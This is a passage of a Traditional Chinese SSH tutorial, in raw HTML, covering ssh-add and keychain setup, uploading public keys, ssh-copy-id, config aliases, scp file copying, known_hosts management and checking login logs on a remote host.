class=\"prism-code language-yaml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># ~/.ssh/config</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Host *</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">AddKeysToAgent yes</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">UseKeychain yes</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">IdentityFile ~/.ssh/id_rsa</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著將利用 <code>--apple-use-keychain</code> 加到 MAC keychain：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-add --apple-use-keychain ~/.ssh/id_rsa</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 或者 -K (Load resident keys from a FIDO authenticator)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-add -K ~/.ssh/id_rsa</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如此，就不需要每次使用 SSH 時都要指定對應的 key。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"將-ssh-公鑰加到服務\">將 SSH 公鑰加到服務<a href=\"#將-ssh-公鑰加到服務\" class=\"hash-link\" aria-label=\"將 SSH 公鑰加到服務的直接連結\" title=\"將 SSH 公鑰加到服務的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"將-ssh-公鑰上傳到-github\">將 SSH 公鑰上傳到 Github<a href=\"#將-ssh-公鑰上傳到-github\" class=\"hash-link\" aria-label=\"將 SSH 公鑰上傳到 Github的直接連結\" title=\"將 SSH 公鑰上傳到 Github的直接連結\">​</a></h4><p>利用 <code>pbcopy</code> 將公鑰複製到剪貼簿：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># Copies the contents of the id_rsa.pub file to your clipboard</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ pbcopy </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&lt;</span><span class=\"token plain\"> ~/.ssh/id_rsa.pub</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># $ cat ~/.ssh/id_rsa.pub | pbcopy    # 這樣也可以</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>在服務網站的位置（例如 Github）點選 <code>SSH and GPG keys &gt; New SSH key/Add SSH key</code></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"將-ssh-公鑰加到遠端主機\">將 SSH 公鑰加到遠端主機<a href=\"#將-ssh-公鑰加到遠端主機\" class=\"hash-link\" aria-label=\"將 SSH 公鑰加到遠端主機的直接連結\" title=\"將 SSH 公鑰加到遠端主機的直接連結\">​</a></h4><p>使用 <code>ssh-copy-id</code> 這個 helper 指令，可以幫助我們把 SSH 的公鑰複製一份到遠端主機上：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># ssh-copy-id &lt;username&gt;@&lt;remote-host&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-copy-id root@192.168.1.4</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>使用 <code>ssh-copy-id</code> 指令時，很有可能需要輸入遠端主機的密碼。</p></blockquote><p>實際上 <code>ssh-copy-id</code> 做的事情如下：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh wavinfo@192.168.1.4    # 登入遠端主機</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">cd ~/.ssh                  # 進入 .ssh 資料夾</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">vim authorized_keys        # 允許的 keys 會被存放在 `authorized_keys` 這隻檔案</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>大家的公鑰都會被放在 <code>~/.ssh/authorized_key</code> 這支檔案中。</p></blockquote><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># ~/.ssh/authorized_key</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-ed25519 AAAAC... calvert</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-rsa AAAAB3...w== Calvert_for_mongodb</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-rsa AAAAB3...Q+7 Andy</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-rsa AAAAB3...eprEQ== Aaron</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"其他\">其他<a href=\"#其他\" class=\"hash-link\" aria-label=\"其他的直接連結\" title=\"其他的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"管理-ssh-passphrase\">管理 SSH passphrase<a href=\"#管理-ssh-passphrase\" class=\"hash-link\" aria-label=\"管理 SSH passphrase的直接連結\" title=\"管理 SSH passphrase的直接連結\">​</a></h3><p>你可以保護你的 SSH Keys 並設定 authentication agent (ssh-agent)，所以就不需要在每次使用 SSH Keys 的時候都要輸入 passphrase。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"新增或編輯-passphrase\">新增或編輯 passphrase<a href=\"#新增或編輯-passphrase\" class=\"hash-link\" aria-label=\"新增或編輯 passphrase的直接連結\" title=\"新增或編輯 passphrase的直接連結\">​</a></h4><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># Start the SSH key creation process</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-keygen -p</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"設定-ssh-config\">設定 SSH Config<a href=\"#設定-ssh-config\" class=\"hash-link\" aria-label=\"設定 SSH Config的直接連結\" title=\"設定 SSH Config的直接連結\">​</a></h3><p>在自己的電腦上，如果經常有登入 SSH 的需要，可以建立一支 <code>~/.ssh/config</code> 檔：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># ~/.ssh/config</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Host wavinfo</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    HostName 192.168.1.4</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    User root</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    IdentityFile ~/.ssh/id_rsa</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    Port 22</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如此可以用 <code>wavinfo</code> 這個 alias 便可以連進指定的主機</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh wavinfo</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"將檔案在本機和遠端主機間複製-scp\">將檔案在本機和遠端主機間複製 scp<a href=\"#將檔案在本機和遠端主機間複製-scp\" class=\"hash-link\" aria-label=\"將檔案在本機和遠端主機間複製 scp的直接連結\" title=\"將檔案在本機和遠端主機間複製 scp的直接連結\">​</a></h3><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-scp\">keywords: <code>scp</code><a href=\"#keywords-scp\" class=\"hash-link\" aria-label=\"keywords-scp的直接連結\" title=\"keywords-scp的直接連結\">​</a></h5><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"複製檔案\">複製檔案<a href=\"#複製檔案\" class=\"hash-link\" aria-label=\"複製檔案的直接連結\" title=\"複製檔案的直接連結\">​</a></h4><p>透過 <code>scp</code> 這個指令可以將本機的檔案複製到遠端主機上：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># scp &lt;file&gt; &lt;username&gt;@&lt;hostname&gt;:&lt;path&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ echo &gt; foo.text</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ scp foo.text wavinfo@192.168.1.4:~/              # 從本機複製到遠端主機根目錄</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ scp wavinfo@192.168.1.4:~/foo.text ./foo.text    # 從遠端主機複製到本機</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ scp -i ~/.ssh/another_key -p 2002 foo.text wavinfo@192.168.1.4:~/ # 指定 identity 和 port</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"複製資料夾\">複製資料夾<a href=\"#複製資料夾\" class=\"hash-link\" aria-label=\"複製資料夾的直接連結\" title=\"複製資料夾的直接連結\">​</a></h4><p>搭配 <code>-r</code> 可以複製整個資料夾：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">mkdir foo</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">echo bar &gt; foo/bar.text</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">scp -r foo wavinfo@192.168.1.7:~/</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"本機的-known_host-和遠端主機上的-fingerprints\">本機的 known_host 和遠端主機上的 fingerprints<a href=\"#本機的-known_host-和遠端主機上的-fingerprints\" class=\"hash-link\" aria-label=\"本機的 known_host 和遠端主機上的 fingerprints的直接連結\" title=\"本機的 known_host 和遠端主機上的 fingerprints的直接連結\">​</a></h3><p>在本機的 <code>~/.ssh/known_hosts</code> 檔案中，記錄了所有過去曾經透過 SSH 連結到的遠端主機。ㄉ</p><p>如果想要知道遠端主機的 fingerprints 可以先透過 SSH 連進遠端主機後，輸入：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 先連進遠端主機後輸入</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">ssh</span><span class=\"token plain\"> wavinfo@192.168.1.4</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-keygen -l -f /etc/ssh/ssh_hosts_ecdsa_key.pub</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如果想要清楚本機連線到某一遠端主機的紀錄，可以輸入：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-keygen -R 192.168.1.4</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"檢視遠端主機上的-log-檔\">檢視遠端主機上的 log 檔<a href=\"#檢視遠端主機上的-log-檔\" class=\"hash-link\" aria-label=\"檢視遠端主機上的 log 檔的直接連結\" title=\"檢視遠端主機上的 log 檔的直接連結\">​</a></h3><p>主機上登入記錄的 log 檔位於 <code>/var/log/auth.log</code>：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh wavinfo@192.168.1.4</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">vim /var/log/auth.log</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>或者可以輸入指令 <code>lastlog</code></p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">lastlog    # 檢視主機上最近的登入紀錄</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">lastlog -u &lt;username&gt; # 檢視某一使用者最近的登入紀錄</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"設定遠端電腦上的-ssh-配置\">設定遠端電腦上的 SSH 配置<a href=\"#設定遠端電腦上的-ssh-配置\" class=\"hash-link\" aria-label=\"設定遠端電腦上的 SSH 配置的直接連結\" title=\"設定遠端電腦上的 SSH 配置的直接連結\">​</a></h3><p>遠端電腦上關於 SSH 的配置通常放在 <code>/etc/ssh/sshd_config</code> 這隻檔案內。</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">vim /etc/ssh/sshd_config  # 修改配置檔</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">service ssh restart        # 重新載入 ssh</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" 